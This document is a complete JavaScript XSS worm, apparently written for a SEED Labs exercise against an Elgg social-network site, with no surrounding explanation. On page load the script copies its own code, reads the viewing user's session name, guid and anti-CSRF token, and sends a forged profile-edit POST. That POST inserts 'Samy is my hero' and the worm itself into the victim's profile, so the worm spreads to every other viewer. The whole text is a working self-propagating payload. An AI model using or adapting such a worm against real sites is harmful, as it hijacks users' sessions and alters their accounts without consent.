<script type="text/javascript" id="worm">
window.onload = function () {
	alert("dom worm")
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script > ";

	// Put all the pieces together, and apply the URI encoding
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

	// Set the content of the description field and access level.
	var desc = "&description=Samy is my hero" + wormCode;
	desc += "&accesslevel[description]=2";

	// Get the name, guid, timestamp, and token.
	var name = "&name=" + elgg.session.user.name;
	var guid = "&guid=" + elgg.session.user.guid;
	var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
	var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

	// Set the URL
	var sendurl = "http://www.seed-server.com/action/profile/edit";
	var content = token + ts + name + desc + guid;

	// Construct and send the Ajax request
	samy_guid = 59
	if (elgg.session.user.guid != samy_guid) {
	    //Create and send Ajax request to modify profile
	    var Ajax = null;
	    Ajax = new XMLHttpRequest();
	    Ajax.open("POST", sendurl, true);
	    Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
	    Ajax.send(content);
	}
}
</script >
